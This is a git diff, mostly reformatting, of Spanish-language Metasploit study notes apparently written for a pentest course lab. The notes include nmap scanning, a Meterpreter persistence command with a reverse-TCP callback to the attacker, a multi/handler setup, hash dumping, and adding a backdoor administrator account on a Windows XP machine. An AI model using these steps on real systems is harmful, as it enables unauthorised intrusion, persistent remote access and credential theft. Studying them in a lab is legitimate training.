@@ -2,7 +2,8 @@
 
 ## Metasploit
 
-`service postgresql start`\
+`service postgresql start`
+
 `netstat -antp`
 
 `msfdb init`--> inicializar la base de datos
@@ -22,8 +23,10 @@ https://en.0day.today/
 
 `nmap 192.168.1.0/24 -A -v -oA cphe` --> escaneo grande verbose y la salida de datos a un fichero llamado cphe
 
-importar archivo cphe en metasploit\
-`hosts`\
+importar archivo cphe en metasploit
+
+`hosts`
+
 `db_status`
 
 `db_import cphe.xml` --> ojo con la ruta
@@ -43,11 +46,11 @@ set RHOSTS 192.168.1.123 192.168.1.122
 run
 ~~~
 
-searchsploit tomcat --> buscar 
+`searchsploit tomcat` --> buscar 
 
-setg rhosts 192.68.1.123 192.168.1.122 --> La g es para guardar los host durante toda la sesion.
+`setg rhosts 192.68.1.123 192.168.1.122` --> La g es para guardar los host durante toda la sesion.
 
-search <CVE code>
+search CVE code
 
 ## Ataques automatizados
 Nessus --> https://es-la.tenable.com/products/nessus/nessus-professional
@@ -73,16 +76,19 @@ meterpreter > getuid --> AUTOHIRY
 meterpreter > run persistence -U -X -i 60 -p 4443 -r <nuestra ip> 
 
 -U: conecta con el atacante cuando se inicia sesion en la victima
+
 -X: intenta conectar cuando inicie/reinicie
+
 -i: cada 60 segundos conecta 
 
 background
-search /multi/handler --> generico 
-use exploit/multi/handler   
-set payload windows/meterpreter/reverse_tcp
-show options
-set lport y lhost
-exploit
+
+* search /multi/handler --> generico 
+* use exploit/multi/handler 
+* set payload windows/meterpreter/reverse_tcp
+* show options
+* set lport y lhost
+* exploit
 
 Reiniciar el windows XP para confirmar que cuando inicie sesion se conecta automaticamente.
 background
@@ -91,10 +97,15 @@ getuid
 hashdump --> password cracking
 
 shell
+
 cd ..
+
 cd ..
+
 c:\> net user intruso pass1234 /add  --> añadir usuario
+
 net localgroup administradores intruso /add --> añadir usuario al grupo administrador para tener permisos
+
 rdesktop <ip windows>  --> echa a la victima si esta conectado
 
 
